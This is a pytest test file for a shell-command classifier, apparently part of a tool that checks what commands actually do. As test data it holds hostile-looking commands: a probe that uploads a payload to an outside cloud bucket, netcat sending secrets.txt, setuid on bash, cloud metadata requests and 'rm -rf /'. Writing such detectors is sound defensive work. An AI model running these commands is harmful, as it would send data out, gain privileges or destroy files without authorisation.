import pytest

from saysdoes.shell import analyze_code, classify, split_commands

COHERE_CMD = (
    '\nls -la /tmp 2>/dev/null; echo "---"; which curl wget python3 jq; echo "---"; '
    'cat /etc/resolv.conf 2>/dev/null | head; echo "---"; curl -s -m 10 -o /tmp/put_probe -X PUT '
    '--data-binary "PROBE_PAYLOAD_ABC123" http://sanmaohe.oss-cn-beijing.aliyuncs.com/upload/test.bin '
    '-w "HTTP:%{http_code}\\n" 2>&1 | tail -3\n'
)


def cats(cmd):
    return [classify(s)[0] for s in split_commands(cmd)]


def test_split_compound_operators():
    assert split_commands("a; b && c || d | e\nf & g") == ["a", "b", "c", "d", "e", "f", "g"]


def test_split_respects_quotes_and_substitution():
    assert split_commands("echo 'a; b' && echo \"c | d\"") == ["echo 'a; b'", 'echo "c | d"']
    assert split_commands("echo $(ls; pwd) ; true") == ["echo $(ls; pwd)", "true"]
    assert split_commands("echo `a | b`") == ["echo `a | b`"]


def test_split_redirects_not_separators():
    assert split_commands("cmd 2>&1 | tail") == ["cmd 2>&1", "tail"]
    assert split_commands("cmd &> out.log") == ["cmd &> out.log"]


def test_split_comments_heredoc_subshell():
    assert split_commands("ls # comment; rm -rf /\npwd") == ["ls", "pwd"]
    segs = split_commands("cat <<EOF > f.txt\nhello; rm x\nEOF\nls")
    assert len(segs) == 2 and segs[1] == "ls" and "hello; rm x" in segs[0]
    assert split_commands("(cd /tmp && ls)") == ["cd /tmp", "ls"]
    assert split_commands("if true; then rm a; fi") == ["true", "rm a"]


def test_cohere_command_split_and_classified():
    segs = split_commands(COHERE_CMD)
    assert len(segs) == 9
    assert cats(COHERE_CMD) == ["fs_list", "other", "env_probe", "other", "fs_read", "other", "other",
                                "network_upload", "other"]
    cat, d = classify(segs[7])
    assert d["method"] == "PUT"
    assert d["hosts"] == ["sanmaohe.oss-cn-beijing.aliyuncs.com"]
    assert d["cloud_storage"] == ["aliyuncs.com"]
    assert d["writes"] == ["/tmp/put_probe"]
    assert classify(segs[4])[1]["reads"] == ["/etc/resolv.conf"]


@pytest.mark.parametrize("cmd,expected", [
    ("ls -la", "fs_list"),
    ("find . -name '*.py'", "fs_list"),
    ("cat a.txt", "fs_read"),
    ("grep foo a.txt", "fs_read"),
    ("grep foo", "other"),
    ("echo hi", "other"),
    ("echo hi > out.txt", "fs_write"),
    ("echo hi >> out.txt", "fs_write"),
    ("echo hi 2>/dev/null", "other"),
    ("rm -rf build", "fs_write"),
    ("mv a b", "fs_write"),
    ("cp a b", "fs_write"),
    ("touch x", "fs_write"),
    ("mkdir -p d", "fs_write"),
    ("tee log.txt", "fs_write"),
    ("sed -i 's/a/b/' f", "fs_write"),
    ("sed 's/a/b/' f", "fs_read"),
    ("which curl", "env_probe"),
    ("uname -a", "env_probe"),
    ("env", "env_probe"),
    ("whoami", "env_probe"),
    ("id", "env_probe"),
    ("hostname", "env_probe"),
    ("command -v jq", "env_probe"),
    ("curl https://example.com", "network"),
    ("wget -qO- https://example.com/x", "network"),
    ("nc example.com 80", "network"),
    ("ssh user@host uptime", "network"),
    ("curl -X POST https://api.example.com", "network_upload"),
    ("curl -d @f https://x.com", "network_upload"),
    ("curl --data-binary @f https://x.com", "network_upload"),
    ("curl -T f https://x.com/", "network_upload"),
    ("curl -F file=@a https://x.com", "network_upload"),
    ("curl -G -d q=1 https://x.com", "network"),
    ("curl -XPUT https://x.com", "network_upload"),
    ("wget --post-data=a=1 https://x.com", "network_upload"),
    ("wget --post-file=f https://x.com", "network_upload"),
    ("nc host 1234 < secrets.txt", "network_upload"),
    ("scp f.txt user@host:/tmp/", "network_upload"),
    ("git push origin main", "network_upload"),
    ("git clone https://github.com/a/b", "network"),
    ("pip install requests", "network"),
    ("sudo ls", "privilege"),
    ("unshare -r bash", "privilege"),
    ("mount /dev/sda1 /mnt", "privilege"),
    ("chmod +s /bin/bash", "privilege"),
    ("chmod 4755 /bin/x", "privilege"),
    ("chmod 644 f", "fs_write"),
    ("python3 script.py", "shell_exec"),
    ("make test", "shell_exec"),
    ("bash -c 'curl -X PUT http://a.com'", "network_upload"),
    ("timeout 5 curl http://a.com", "network"),
    ("FOO=1 env BAR=2 cat x", "fs_read"),
    ("aws s3 cp f s3://bucket/key", "network_upload"),
])
def test_classify(cmd, expected):
    assert classify(cmd)[0] == expected, (cmd, classify(cmd))


def test_curl_output_is_write():
    cat, d = classify("curl -o out.bin https://example.com/x")
    assert cat == "network" and d["writes"] == ["out.bin"]
    assert "writes" not in classify("curl -o /dev/null https://example.com")[1]


def test_hosts_cloud_and_metadata():
    _, d = classify("curl http://169.254.169.254/latest/meta-data/")
    assert d["metadata_hosts"] == ["169.254.169.254"]
    _, d = classify("curl http://100.100.100.200/latest/meta-data/")
    assert d["metadata_hosts"] == ["100.100.100.200"]
    for host, suf in [("b.s3.amazonaws.com", "amazonaws.com"), ("acct.blob.core.windows.net", "blob.core.windows.net"),
                      ("storage.googleapis.com", "storage.googleapis.com")]:
        _, d = classify(f"curl -T f https://{host}/k")
        assert d["cloud_storage"] == [suf]
    _, d = classify("aws s3 cp f s3://bucket/key")
    assert "amazonaws.com" in d["cloud_storage"]
    assert "cloud_storage" not in classify("curl https://example.com")[1]


def test_analyze_python_code():
    assert analyze_code("import requests\nrequests.get('https://a.com')")[0] == "network"
    cat, d = analyze_code("import requests\nrequests.put('https://b.oss-cn-x.aliyuncs.com/k', data=b'x')")
    assert cat == "network_upload" and d["cloud_storage"] == ["aliyuncs.com"]
    cat, d = analyze_code("open('out.txt', 'w').write('x')")
    assert cat == "fs_write" and d["writes"] == ["out.txt"]
    assert analyze_code("print(open('a.txt').read())")[0] == "fs_read"
    assert analyze_code("import os; os.system('curl -X POST http://x.com')")[0] == "network_upload"
    assert analyze_code("print(1+1)")[0] == "shell_exec"


# --- in-place editors are writes ----------------------------------------------------------------------

@pytest.mark.parametrize("cmd,writes", [
    ("perl -pi -e 's/n \\* size/(n - 1) * size/' src/shop/paginate.py", ["src/shop/paginate.py"]),
    ("perl -i.bak -pe 's/a/b/' a.txt b.txt", ["a.txt", "b.txt"]),
    ("perl -0777 -pi -e 's/a/b/gs' x.py", ["x.py"]),
    ("perl -Ilib -i -pe 's/a/b/' x.py", ["x.py"]),
    ("sed -i 's/a/b/' f.py", ["f.py"]),
    ("sed -i'' 's/a/b/' f.py", ["f.py"]),
    ("sed -i '' -e 's/a/b/' f.py g.py", ["f.py", "g.py"]),  # BSD empty suffix
    ("sed -i.orig -e 's/a/b/' -e 's/c/d/' f.py", ["f.py"]),
    ("sed --in-place=.bak 's/a/b/' f.py", ["f.py"]),
    ("sed --in-place -f fix.sed f.py", ["f.py"]),
    ("sed -Ei 's/(a)/b/' f.py", ["f.py"]),
    ("ruby -pi -e 'gsub(/a/, \"b\")' r.rb", ["r.rb"]),
    ("ruby -i.bak -pe 'sub(/x/, \"y\")' r.rb", ["r.rb"]),
    ("gawk -i inplace '{ sub(/a/, \"b\") } 1' g.txt", ["g.txt"]),
    ("awk -i inplace -v n=1 '{print}' g.txt", ["g.txt"]),
    ("gawk -iinplace '{print}' g.txt", ["g.txt"]),
    ("ed -s f.txt <<'EOF'\n,s/a/b/g\nw\nq\nEOF", ["f.txt"]),
    ("ed -s f.txt", ["f.txt"]),  # script on stdin, unseen
    ("ex -sc '%s/a/b/g|x' f.txt", ["f.txt"]),
    ("vim -es -c '%s/a/b/' -c wq f.txt", ["f.txt"]),
    ("sudo sed -i 's/a/b/' /etc/hosts", ["/etc/hosts"]),
])
def test_in_place_edits_are_writes(cmd, writes):
    cat, d = classify(cmd)
    assert cat in ("fs_write", "privilege") and d["writes"] == writes and d["in_place"], (cmd, cat, d)


@pytest.mark.parametrize("cmd,cat", [
    ("sed -n '1,5p' f.py", "fs_read"),
    ("sed -e 's/a/b/' f.py", "fs_read"),
    ("sed -E 's/a/b/' f.py", "fs_read"),
    ("perl -ne 'print if /x/' f.txt", "fs_read"),
    ("perl -Ilib -ne 'print if /x/' f.txt", "fs_read"),  # the "i" in -Ilib is not -i
    ("perl -Mstrict -e 'print 1'", "shell_exec"),
    ("ruby -ne 'puts $_' r.rb", "fs_read"),
    ("awk '{print $1}' g.txt", "fs_read"),
    ("ed -s f.txt <<'EOF'\n,p\nq\nEOF", "shell_exec"),  # visible script never writes
    ("ex -sc '%p|q!' f.txt", "shell_exec"),
])
def test_editors_without_in_place_are_not_writes(cmd, cat):
    got, d = classify(cmd)
    assert got == cat and not d.get("writes"), (cmd, got, d)


def test_in_place_with_unseen_targets_and_find_exec():
    assert classify("xargs sed -i 's/a/b/'") == ("fs_write", {"argv0": "sed", "in_place": True,
                                                                "writes": ["(unknown)"]})
    cat, d = classify("find . -name '*.py' -exec perl -pi -e 's/a/b/' {} +")
    assert cat == "fs_write" and d["writes"]


def test_python_fileinput_inplace_is_a_write():
    cat, d = analyze_code("import fileinput\nfor l in fileinput.input('a.py', inplace=True): print(l, end='')")
    assert cat == "fs_write" and d["writes"] == ["a.py"]
    cat, d = analyze_code("import fileinput, sys\nfor l in fileinput.input(sys.argv[1:], inplace=1): pass")
    assert cat == "fs_write" and d["writes"] == ["(from code)"]
    assert analyze_code("import fileinput\nfor l in fileinput.input('a.py'): print(l)")[0] == "shell_exec"


# --- importing a networking library is not network access ------------------------------------------------

@pytest.mark.parametrize("cmd", [
    "python -c \"import paramiko, sys; print(paramiko.__file__); print(paramiko.__version__)\"",
    "python3 -c 'import paramiko; print(paramiko.__version__)'",
    "python -c 'import requests, httpx, socket, boto3'",
    "python3 -c 'import sqlite3; sqlite3.connect(\"db.sqlite\")'",
    "python - <<'EOF'\nimport paramiko\nfrom paramiko.buffered_pipe import BufferedPipe\nBufferedPipe().feed(b'x')\nEOF",
])
def test_python_import_only_is_not_network(cmd):
    assert classify(cmd)[0] != "network", cmd


@pytest.mark.parametrize("code", [
    "import urllib.request; urllib.request.urlopen('x')",
    "from urllib.request import urlopen\nurlopen(req)",
    "import requests; requests.get(u)",
    "import httpx\nwith httpx.Client() as c: pass",
    "import http.client; c = http.client.HTTPSConnection(h)",
    "import socket; s = socket.socket(); s.connect((h, 80))",
    "import socket; socket.create_connection((h, 443))",
    "import paramiko; c = paramiko.SSHClient(); client.connect(h)",
    "import pip; pip.main(['install', 'x'])",
    "import subprocess; subprocess.run(['pip', 'install', 'x'])",
])
def test_python_network_calls_are_network(code):
    assert analyze_code(code)[0] in ("network", "network_upload"), code
